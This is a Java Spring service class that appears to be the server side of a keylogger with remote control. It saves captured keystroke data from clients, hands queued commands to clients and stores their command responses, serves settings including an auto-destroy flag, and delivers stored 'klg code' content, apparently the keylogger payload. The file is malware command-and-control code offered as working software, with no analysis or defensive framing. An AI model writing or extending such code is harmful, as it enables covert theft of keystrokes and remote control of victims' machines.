package com.klg.client.service;

import com.klg.client.model.CommandResponseEntity;
import com.klg.client.model.CommandResponseRequest;
import com.klg.client.model.KeyloggerData;
import com.klg.client.model.KeyloggerEntity;
import com.klg.client.model.KlgCodeResponse;
import com.klg.client.model.SettingsResponse;
import com.klg.client.model.SyncedCommandResponse;
import com.klg.client.repository.ClientLogsRepository;
import com.klg.client.repository.CommandResponseRepository;
import com.klg.client.repository.KlgCodeRepository;
import com.klg.client.repository.SettingsRepository;
import com.klg.client.repository.SyncedCommandRepository;
import java.util.UUID;
import lombok.RequiredArgsConstructor;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

@Service
@RequiredArgsConstructor
public class ClientService {

  private final ClientLogsRepository repository;
  private final SyncedCommandRepository commandRepository;
  private final SettingsRepository settingsRepository;
  private final CommandResponseRepository commandResponseRepository;
  private final KlgCodeRepository klgCodeRepository;

  @Transactional
  public void keyloggerData(KeyloggerData keyloggerData) {
    repository.save(new KeyloggerEntity(UUID.randomUUID().toString(), keyloggerData.content()));
  }

  @Transactional
  public SyncedCommandResponse cmd() {
    var cmds = commandRepository.findAll();
    if (cmds.isEmpty()) {
      return new SyncedCommandResponse("");
    }
    commandRepository.deleteAll();
    return new SyncedCommandResponse(cmds.get(0).getCommand());
  }

  @Transactional
  public SettingsResponse settings() {
    var settings = settingsRepository.findAll();
    if (settings.isEmpty()) {
      return new SettingsResponse(false, true);
    }
    return new SettingsResponse(settings.get(0).getAutoDestroy(), settings.get(0).getFlushBuffer());
  }

  @Transactional
  public void saveResponse(CommandResponseRequest request) {
    commandResponseRepository.save(new CommandResponseEntity(UUID.randomUUID().toString(), request.cmd()));
  }

  @Transactional
  public KlgCodeResponse klgCode() {
    return new KlgCodeResponse(klgCodeRepository.findAll().get(0).getContent());
  }
}
